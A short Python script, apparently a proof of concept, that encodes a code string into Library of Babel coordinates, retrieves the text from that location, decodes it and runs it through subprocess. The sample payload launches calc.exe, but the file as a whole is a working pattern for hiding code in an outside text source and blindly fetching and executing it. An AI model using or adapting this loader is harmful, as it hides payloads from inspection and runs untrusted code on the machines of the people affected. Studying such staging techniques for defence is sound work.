import babel
import encoder
import subprocess

original_text = "import subprocess; subprocess.Popen('calc.exe')"

result = encoder.encode_to_babel(original_text)
print("String encoded to Babel format:", result)

hex, wall, shelf, volume, page = babel.search(result)

response = babel.browse(hex, wall, shelf, volume, page)
print("Babel response:", response)

decoded = encoder.decode_from_babel(response)
print("Decoded string:", decoded)
result = subprocess.run(["python", "-c", decoded], capture_output=True, text=True)
print("Subprocess output:", result.stdout)